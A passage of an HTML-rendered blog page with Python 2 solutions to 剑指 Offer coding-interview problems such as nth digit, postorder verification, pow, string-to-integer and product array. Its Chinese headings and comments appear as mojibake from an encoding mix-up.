"""</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">dfs</span><span class="params">(i,j,k)</span>:</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">0</span>&lt;= i &lt;m <span class="keyword">or</span> <span class="keyword">not</span> <span class="number">0</span>&lt;= j &lt;n <span class="keyword">or</span> (i,j) <span class="keyword">in</span> a <span class="keyword">or</span> (i%<span class="number">10</span>+i//<span class="number">10</span>+j%<span class="number">10</span>+j//<span class="number">10</span>)&gt;k: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            <span class="comment">#æŠŠè¿™ä¸ªç‚¹åŠ å…¥åˆ°è®¿é—®é›†åˆä¸­</span></span><br><span class="line">            a.add((i,j))</span><br><span class="line">            <span class="comment">#å› ä¸ºä»ï¼ˆ0,0ï¼‰å¼€å§‹ï¼Œæ‰€ä»¥åªè¦å‘ä¸‹èµ°æˆ–å‘å³èµ°å°±è¡Œ</span></span><br><span class="line">            dfs(i+<span class="number">1</span>,j,k)</span><br><span class="line">            dfs(i,j+<span class="number">1</span>,k) </span><br><span class="line">        a = set()</span><br><span class="line">        dfs(<span class="number">0</span>,<span class="number">0</span>,k)</span><br><span class="line">        <span class="keyword">return</span> len(a)</span><br></pre></td></tr></table></figure><h4 id="å‰‘æŒ‡-Offer-44-æ•°å­—åºåˆ—ä¸­æŸä¸€ä½çš„æ•°å­—-medium"><a href="#å‰‘æŒ‡-Offer-44-æ•°å­—åºåˆ—ä¸­æŸä¸€ä½çš„æ•°å­—-medium" class="headerlink" title="å‰‘æŒ‡ Offer 44. æ•°å­—åºåˆ—ä¸­æŸä¸€ä½çš„æ•°å­—(medium)"></a>å‰‘æŒ‡ Offer 44. æ•°å­—åºåˆ—ä¸­æŸä¸€ä½çš„æ•°å­—(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findNthDigit</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> n &lt; <span class="number">10</span>:</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        num = <span class="number">0</span></span><br><span class="line">        temp=<span class="number">0</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        å¦‚æœnå¤§äº9çš„è¯ï¼Œåˆ¤æ–­nåº”è¯¥åœ¨å“ªä¸ªåŒºé—´</span></span><br><span class="line"><span class="string">        å› ä¸º1ä½æ•°ä¸€å…±æœ‰9ä¸ª</span></span><br><span class="line"><span class="string">        2ä½æ•°æœ‰90*2=180ä¸ª</span></span><br><span class="line"><span class="string">        3ä½æ•°æœ‰900*3=2700ä¸ª</span></span><br><span class="line"><span class="string">        å› æ­¤æˆ‘ä»¬å¯ä»¥çŸ¥é“nä½æ•°æœ‰9*(10**(i-1)*i)ä¸ª</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">while</span> n&gt;num:</span><br><span class="line">            temp = num <span class="comment">#tempä¿å­˜ä¸Šä¸€ä¸ªnumçš„æ•°</span></span><br><span class="line">            addnum = <span class="number">9</span>*(<span class="number">10</span>**i)*(i+<span class="number">1</span>)</span><br><span class="line">            num+=addnum</span><br><span class="line">            i+=<span class="number">1</span></span><br><span class="line">        res = n-temp <span class="comment">#å‡å»åŒºé—´ä¹‹å‰çš„é‚£äº›æ•°</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        æ­¤æ—¶å¾—åˆ°çš„iå¦‚æœæ˜¯3ï¼Œåˆ™è¯´æ˜ä»ä¸‰ä½æ•°å¼€å§‹</span></span><br><span class="line"><span class="string">        å¯ä»¥å¾—åˆ°åŒºé—´åœ¨100-1000ä¹‹é—´</span></span><br><span class="line"><span class="string">        ä»è€Œç®—å¾—èµ·å§‹çš„æ•°æ˜¯10**(3-1)=100</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        start_num = <span class="number">10</span>**(i<span class="number">-1</span>)</span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        å› ä¸ºåœ¨è¿™ä¸ªåŒºé—´æ¯ä¸€ä¸ªæ•°éƒ½æ˜¯iä½ï¼Œå› æ­¤æˆ‘ä»¬å¾—åˆ°é™¤æ•°div</span></span><br><span class="line"><span class="string">        å¯¹äºä¸‰ä½æ•°æ¥è®²ï¼Œå¦‚æœé™¤æ•°div=10ï¼Œåˆ™å¯ä»¥å¾—åˆ°æ•°å­—æ˜¯åœ¨100+10-1=109é™„è¿‘</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        div = res / i</span><br><span class="line">        mod = res % i</span><br><span class="line">        new_num = start_num + div - <span class="number">1</span> <span class="comment">#è¿™ä¸ªæ•°å­—å°±æ˜¯åŒºé—´å†…åŠ ä¸Šé™¤æ•°ä¹‹åçš„æ•°å­—</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        è¿›ä¸€æ­¥é€šè¿‡ä½™æ•°åˆ¤æ–­ï¼Œå¦‚æœä½™æ•°ä¸º0ï¼Œåˆ™è¯´æ˜å½“å‰å¾—åˆ°çš„æ•°å­—çš„æœ€åä¸€ä¸ªæ•°å­—å°±æ˜¯ç»“æœ</span></span><br><span class="line"><span class="string">        å¦‚æœä½™æ•°ä¸ä¸º0ï¼Œåˆ™è¯´æ˜æœ€ç»ˆç»“æœåœ¨ä¸‹ä¸€ä¸ªæ•°å­—ï¼Œä»è€Œæ ¹æ®ä½™æ•°å¾—åˆ°æœ€ç»ˆç»“æœ</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> mod == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> int(str(new_num)[<span class="number">-1</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> int(str(new_num+<span class="number">1</span>)[mod - i - <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">        <span class="comment">#ç¬¬ä¸€ç§æ–¹æ³•ï¼Œè¶…æ—¶äº†</span></span><br><span class="line">        <span class="comment"># s=0</span></span><br><span class="line">        <span class="comment"># for i in range(n+1):</span></span><br><span class="line">        <span class="comment">#     s+=len(str(i))</span></span><br><span class="line">        <span class="comment">#     if s&gt;=n+1:</span></span><br><span class="line">        <span class="comment">#         return int(str(i)[n-temp])</span></span><br></pre></td></tr></table></figure><h4 id="å‰‘æŒ‡-Offer-33-äºŒå‰æœç´¢æ ‘çš„ååºéå†åºåˆ—-medium"><a href="#å‰‘æŒ‡-Offer-33-äºŒå‰æœç´¢æ ‘çš„ååºéå†åºåˆ—-medium" class="headerlink" title="å‰‘æŒ‡ Offer 33. äºŒå‰æœç´¢æ ‘çš„ååºéå†åºåˆ—(medium)"></a>å‰‘æŒ‡ Offer 33. äºŒå‰æœç´¢æ ‘çš„ååºéå†åºåˆ—(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">verifyPostorder</span><span class="params">(self, postorder)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type postorder: List[int]</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> len(postorder) == <span class="number">1</span> <span class="keyword">or</span> (<span class="keyword">not</span> postorder):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        root = postorder[<span class="number">-1</span>] <span class="comment">#ååºéå†æœ€åä¸€ä¸ªå€¼ä¸ºæ ¹ç»“ç‚¹</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(postorder)): <span class="comment">#æ‰¾åˆ°æ ¹èŠ‚ç‚¹å³å­æ ‘çš„ç¬¬ä¸€ä¸ªå€¼</span></span><br><span class="line">            <span class="keyword">if</span> postorder[i]&gt;=root:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        left = postorder[:i] <span class="comment">#åˆ’åˆ†å·¦å­æ ‘</span></span><br><span class="line">        right = postorder[i:len(postorder)<span class="number">-1</span>] <span class="comment">#åˆ’åˆ†å³å­æ ‘</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> left: <span class="comment">#å¦‚æœå·¦å­æ ‘ä¸­æœ‰å°äºæ ¹çš„ï¼Œç›´æ¥return </span></span><br><span class="line">            <span class="keyword">if</span> i&gt;root:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> right: <span class="comment">#å¦‚æœå³å­æ ‘ä¸­æœ‰å°äºæ ¹çš„ï¼Œç›´æ¥return </span></span><br><span class="line">            <span class="keyword">if</span> i&lt;root:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        left = self.verifyPostorder(left) <span class="comment">#é€’å½’åˆ¤æ–­å·¦å­æ ‘</span></span><br><span class="line">        right = self.verifyPostorder(right) <span class="comment">#é€’å½’åˆ¤æ–­å³å­æ ‘</span></span><br><span class="line">        <span class="keyword">if</span> left <span class="keyword">and</span> right:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><h4 id="å‰‘æŒ‡-Offer-16-æ•°å€¼çš„æ•´æ•°æ¬¡æ–¹-medium"><a href="#å‰‘æŒ‡-Offer-16-æ•°å€¼çš„æ•´æ•°æ¬¡æ–¹-medium" class="headerlink" title="å‰‘æŒ‡ Offer 16. æ•°å€¼çš„æ•´æ•°æ¬¡æ–¹(medium)"></a>å‰‘æŒ‡ Offer 16. æ•°å€¼çš„æ•´æ•°æ¬¡æ–¹(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">myPow</span><span class="params">(self, x, n)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type x: float</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :rtype: float</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> n==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> n &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>/x * self.myPow(<span class="number">1</span>/x,-n<span class="number">-1</span>) </span><br><span class="line">        <span class="keyword">if</span> n%<span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> x * self.myPow(x*x,n/<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> n%<span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> self.myPow(x*x,n/<span class="number">2</span>)</span><br></pre></td></tr></table></figure><h4 id="å‰‘æŒ‡-Offer-67-æŠŠå­—ç¬¦ä¸²è½¬æ¢æˆæ•´æ•°-medium"><a href="#å‰‘æŒ‡-Offer-67-æŠŠå­—ç¬¦ä¸²è½¬æ¢æˆæ•´æ•°-medium" class="headerlink" title="å‰‘æŒ‡ Offer 67. æŠŠå­—ç¬¦ä¸²è½¬æ¢æˆæ•´æ•°(medium)"></a>å‰‘æŒ‡ Offer 67. æŠŠå­—ç¬¦ä¸²è½¬æ¢æˆæ•´æ•°(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">strToInt</span><span class="params">(self, str)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type str: str</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        str = list(str.lstrip())  <span class="comment"># å»æ‰å¼€å¤´å¤šä½™çš„ç©ºæ ¼</span></span><br><span class="line">        num = [<span class="string">'0'</span>, <span class="string">'1'</span>,<span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>]</span><br><span class="line">        <span class="keyword">if</span> len(str)==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> len(str)==<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> str[<span class="number">0</span>] <span class="keyword">in</span> num:</span><br><span class="line">                <span class="keyword">return</span> int(str[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; len(str):</span><br><span class="line">            <span class="keyword">if</span> str[i] != <span class="string">"-"</span> <span class="keyword">and</span> str[i] != <span class="string">"+"</span> <span class="keyword">and</span> str[i] <span class="keyword">not</span> <span class="keyword">in</span> num:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            <span class="keyword">elif</span> str[i] == <span class="string">'-'</span> <span class="keyword">or</span> str[i] == <span class="string">'+'</span>: <span class="comment">#å¤„ç†ä»¥â€˜-â€™å’Œâ€˜+â€™å¼€å¤´çš„</span></span><br><span class="line">                temp=str[i] <span class="comment">#ä¿å­˜â€˜+-â€™ç¬¦å·</span></span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> str[i] <span class="keyword">not</span> <span class="keyword">in</span> num:</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">while</span> i &lt; len(str):</span><br><span class="line">                        <span class="keyword">if</span> str[i] <span class="keyword">in</span> num:</span><br><span class="line">                            res *= <span class="number">10</span></span><br><span class="line">                            res += int(str[i])</span><br><span class="line">                            i += <span class="number">1</span></span><br><span class="line">                        <span class="keyword">else</span>: <span class="comment">#å¦‚æœç¬¬iä¸ªå­—ç¬¦ä¸æ˜¯æ•°å­—ç›´æ¥é€€å‡º</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">if</span> temp == <span class="string">'-'</span>:</span><br><span class="line">                        <span class="keyword">if</span> res&gt;pow(<span class="number">2</span>,<span class="number">31</span>):</span><br><span class="line">                            <span class="keyword">return</span> -pow(<span class="number">2</span>,<span class="number">31</span>)</span><br><span class="line">                        <span class="keyword">return</span> -res</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">if</span> res&gt;pow(<span class="number">2</span>,<span class="number">31</span>)<span class="number">-1</span>:</span><br><span class="line">                            <span class="keyword">return</span> pow(<span class="number">2</span>,<span class="number">31</span>)<span class="number">-1</span></span><br><span class="line">                        <span class="keyword">return</span> res</span><br><span class="line">            <span class="keyword">elif</span> str[i] <span class="keyword">in</span> num: <span class="comment">#å¤„ç†ä»¥å­—æ¯å¼€å¤´çš„</span></span><br><span class="line">                <span class="keyword">while</span> i &lt; len(str):</span><br><span class="line">                        <span class="keyword">if</span> str[i] <span class="keyword">in</span> num:</span><br><span class="line">                            res *= <span class="number">10</span></span><br><span class="line">                            res += int(str[i])</span><br><span class="line">                            i += <span class="number">1</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> res&gt;pow(<span class="number">2</span>,<span class="number">31</span>)<span class="number">-1</span>:</span><br><span class="line">                    <span class="keyword">return</span> pow(<span class="number">2</span>,<span class="number">31</span>)<span class="number">-1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h4 id="å‰‘æŒ‡-Offer-46-æŠŠæ•°å­—ç¿»è¯‘æˆå­—ç¬¦ä¸²-medium"><a href="#å‰‘æŒ‡-Offer-46-æŠŠæ•°å­—ç¿»è¯‘æˆå­—ç¬¦ä¸²-medium" class="headerlink" title="å‰‘æŒ‡ Offer 46. æŠŠæ•°å­—ç¿»è¯‘æˆå­—ç¬¦ä¸²(medium)"></a>å‰‘æŒ‡ Offer 46. æŠŠæ•°å­—ç¿»è¯‘æˆå­—ç¬¦ä¸²(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">translateNum</span><span class="params">(self, num)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type num: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> num &lt; <span class="number">10</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> num%<span class="number">100</span>&lt;<span class="number">10</span> <span class="keyword">or</span> num%<span class="number">100</span>&gt;<span class="number">25</span>:</span><br><span class="line">            <span class="keyword">return</span> self.translateNum(num/<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> (self.translateNum(num/<span class="number">10</span>)+self.translateNum(num/<span class="number">100</span>))</span><br></pre></td></tr></table></figure><h4 id="å‰‘æŒ‡-Offer-14-II-å‰ªç»³å­-II-medium"><a href="#å‰‘æŒ‡-Offer-14-II-å‰ªç»³å­-II-medium" class="headerlink" title="å‰‘æŒ‡ Offer 14- II. å‰ªç»³å­ II(medium)"></a>å‰‘æŒ‡ Offer 14- II. å‰ªç»³å­ II(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cuttingRope</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        å°½å¯èƒ½åˆ†æˆé•¿åº¦ä¸º3çš„</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> n&lt;=<span class="number">3</span>:</span><br><span class="line">            <span class="keyword">return</span> n<span class="number">-1</span></span><br><span class="line">        res = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> n&gt;<span class="number">4</span>:</span><br><span class="line">            res*=<span class="number">3</span></span><br><span class="line">            n-=<span class="number">3</span></span><br><span class="line">        <span class="keyword">return</span> (res*n)% <span class="number">1000000007</span></span><br></pre></td></tr></table></figure><h4 id="å‰‘æŒ‡-Offer-66-æ„å»ºä¹˜ç§¯æ•°ç»„-medium"><a href="#å‰‘æŒ‡-Offer-66-æ„å»ºä¹˜ç§¯æ•°ç»„-medium" class="headerlink" title="å‰‘æŒ‡ Offer 66. æ„å»ºä¹˜ç§¯æ•°ç»„(medium)"></a>å‰‘æŒ‡ Offer 66. æ„å»ºä¹˜ç§¯æ•°ç»„(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">constructArr</span><span class="params">(self, a)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type a: List[int]</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        ä»å‰å‘åç´¯ä¹˜ä¸€æ¬¡å¹¶ä¿å­˜ç»“æœï¼Œä»åå‘å‰ç´¯ä¹˜ä¸€æ¬¡å¹¶ä¿å­˜ç»“æœ</span></span><br><span class="line"><span class="string">        å°±[1,2,3,4,5]è€Œè¨€</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> len(a)==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        res1 = [] </span><br><span class="line">        res2 = []</span><br><span class="line">        result = []</span><br><span class="line">        m = <span class="number">1</span></span><br><span class="line">        n = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> a[:<span class="number">-1</span>]: <span class="comment">#ä»å‰å‘åä¹˜åªè®¡ç®—åˆ°å€’æ•°ç¬¬äºŒä¸ªæ•°</span></span><br><span class="line">            m*=i</span><br><span class="line">            res1.append(m) <span class="comment">#res1ä¸­ä¿å­˜[1,1*2,1*2*3,1*2*3*4]</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> a[::<span class="number">-1</span>][:<span class="number">-1</span>]: <span class="comment">#ä»åå‘å‰ä¹˜åªè®¡ç®—åˆ°ç¬¬äºŒä¸ªæ•°</span></span><br><span class="line">            n*=i</span><br><span class="line">            res2.append(n) <span class="comment">#res2ä¸­ä¿å­˜[5,5*4,5*4*3,5*4*3*2]</span></span><br><span class="line">        res2 = res2[::<span class="number">-1</span>] <span class="comment">#åè½¬åå¾—[5*4*3*2,5*4*3,5*4,5]</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        æ­¤æ—¶res1 = [1,1*2,1*2*3,1*2*3*4]</span></span><br><span class="line"><span class="string">            res2 = [5*4*3*2,5*4*3,5*4,5]</span></span><br><span class="line"><span class="string">        æˆ‘ä»¬å¯ä»¥å¾—åˆ°å½“ç¼ºå¤±ç¬¬ä¸€ä¸ªæ•°æ—¶ï¼Œå€¼ä¸ºres2[0]</span></span><br><span class="line"><span class="string">        å½“ç¼ºå¤±æœ€åä¸€ä¸ªæ•°æ—¶ï¼Œå€¼ä¸ºres1[-1]</span></span><br><span class="line"><span class="string">        ä»ç¼ºå¤±ç¬¬äºŒä¸ªæ•°åˆ°å€’æ•°ç¬¬äºŒä¸ªæ•°</span></span><br><span class="line"><span class="string">        æˆ‘ä»¬å¯ä»¥å¾—åˆ°å€¼ä¸ºres[i]*res[i-1]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(res2)+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                result.append(res2[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">elif</span> i == len(res2):</span><br><span class="line">                result.append(res1[<span class="number">-1</span>])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result.append(res2[i]*res1[i<span class="number">-1</span>])</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><h4 id="å‰‘æŒ‡-Offer-63-è‚¡ç¥¨çš„æœ€å¤§åˆ©æ¶¦-medium"><a href="#å‰‘æŒ‡-Offer-63-è‚¡ç¥¨çš„æœ€å¤§åˆ©æ¶¦-medium" class="headerlink" title="å‰‘æŒ‡ Offer 63. è‚¡ç¥¨çš„æœ€å¤§åˆ©æ¶¦(medium)"></a>å‰‘æŒ‡ Offer 63. è‚¡ç¥¨çš„æœ€å¤§åˆ©æ¶¦(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxProfit</span><span class="params">(self, prices)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type prices: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span 